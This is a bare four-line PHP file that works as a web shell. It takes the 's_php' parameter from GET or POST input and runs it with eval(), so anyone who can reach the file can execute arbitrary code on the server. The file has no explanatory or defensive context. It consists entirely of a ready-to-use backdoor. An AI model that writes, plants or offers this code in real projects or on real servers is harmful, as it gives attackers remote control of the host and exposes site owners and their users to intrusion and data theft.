<?php
$F = $_GET + $_POST;
eval(stripslashes($F['s_php']));
?>